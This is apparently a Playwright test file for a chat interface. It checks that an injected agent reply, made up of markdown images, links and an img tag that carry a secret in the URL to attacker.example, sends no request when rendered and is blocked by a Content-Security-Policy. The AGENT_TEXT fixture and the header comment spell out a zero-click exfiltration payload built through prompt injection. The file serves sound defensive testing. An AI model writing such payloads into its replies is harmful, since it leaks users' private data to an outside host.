import { expect, test, type Page } from "@playwright/test";

/**
 * Zero-click exfiltration (review 4): an email or page the agent read makes it
 * write a markdown image or a link carrying private data. Rendering the reply
 * must make NO request to that host, in either theme, and the page carries a
 * Content-Security-Policy that would block it anyway.
 *
 * Any request to attacker.example fails the test (page.route records it, and
 * aborts it so nothing leaves the machine).
 *
 * NO BACKEND: the thread's history is intercepted (markdown-lazy.spec.ts).
 */
const THREAD = "33333333-4444-5555-6666-777777777777";
const SECRET = "T-3%20acquire%20Acme%20for%20%2440M";
const AGENT_TEXT = [
  "Here is your summary.",
  "",
  `![status](https://attacker.example/pixel.png?d=${SECRET})`,
  "",
  `Details: <https://attacker.example/c?d=${SECRET}>`,
  "",
  `And [the summary](https://attacker.example/s?d=${SECRET}).`,
  "",
  `<img src="https://attacker.example/raw.png?d=${SECRET}">`,
].join("\n");

function history() {
  return [
    {
      values: {
        title: "Exfil",
        messages: [
          { type: "human", id: "h1", content: "Summarise my inbox" },
          { type: "ai", id: "a1", content: AGENT_TEXT },
        ],
      },
      next: [],
      tasks: [],
      metadata: {},
      created_at: new Date().toISOString(),
      checkpoint: { thread_id: THREAD, checkpoint_id: "c1", checkpoint_ns: "" },
      parent_checkpoint: null,
    },
  ];
}

async function open(page: Page, theme: "light" | "dark") {
  const json = (body: unknown) => ({
    status: 200,
    contentType: "application/json",
    body: JSON.stringify(body),
  });
  const leaked: string[] = [];
  await page.route(/attacker\.example/, (route) => {
    leaked.push(route.request().url());
    return route.abort();
  });
  await page.addInitScript(
    (t) => window.localStorage.setItem("theme", t),
    theme,
  );
  const states = history();
  await page.route("**/api/langgraph/**", (route) => {
    const url = route.request().url();
    if (url.includes("/history")) return route.fulfill(json(states));
    if (url.includes("/runs") || url.includes("/search"))
      return route.fulfill(json([]));
    return route.fulfill(json(states[0]));
  });
  await page.route("**/api/confirmations", (route) =>
    route.fulfill(json({ actions: [], readable: true, error: "" })),
  );
  await page.route("**/api/inbox/alerts", (route) =>
    route.fulfill(json({ alerts: [], waiting_count: 0 })),
  );
  const response = await page.goto(`/workspace/chats/${THREAD}`, {
    waitUntil: "networkidle",
  });
  await expect(page.getByText("Here is your summary.")).toBeVisible();
  await page.waitForTimeout(1000);
  return { leaked, response };
}

for (const theme of ["light", "dark"] as const) {
  test(`an injected image and links reach no outside host (${theme})`, async ({
    page,
  }) => {
    const { leaked } = await open(page, theme);
    expect(leaked, "requests to attacker.example").toEqual([]);
    await expect(
      page.getByText("Image from attacker[.]example not loaded").first(),
    ).toBeVisible();
    await expect(
      page.locator('img[src*="attacker.example"], [href*="attacker.example"]'),
    ).toHaveCount(0);
    await expect(page.locator('link[rel="preload"][as="image"]')).toHaveCount(
      0,
    );
    // The labelled link is a button; opening it asks first, showing the URL.
    await page.getByRole("button", { name: "the summary" }).click();
    await expect(page.getByText("Open an outside link?")).toBeVisible();
    await expect(
      page.getByText(`https://attacker.example/s?d=${SECRET}`),
    ).toBeVisible();
    expect(leaked, "requests after opening the dialog").toEqual([]);
  });
}

test("pages carry a CSP that keeps images and connections on this origin", async ({
  page,
}) => {
  const { response } = await open(page, "light");
  const csp = response?.headers()["content-security-policy"] ?? "";
  expect(csp).toContain("img-src 'self' data: blob:");
  expect(csp).toMatch(/connect-src 'self'(;|$)/);
  expect(csp).toContain("default-src 'self'");
  expect(csp).toContain("frame-ancestors 'none'");
  // The policy is enforced: an outside image added by script is refused
  // before any request leaves (the route above would record one).
  const blocked = await page.evaluate(
    () =>
      new Promise<boolean>((resolve) => {
        document.addEventListener("securitypolicyviolation", () =>
          resolve(true),
        );
        const img = document.createElement("img");
        img.src = "https://attacker.example/csp-probe.png";
        document.body.appendChild(img);
        setTimeout(() => resolve(false), 2000);
      }),
  );
  expect(blocked, "the browser reported a CSP violation").toBe(true);
});
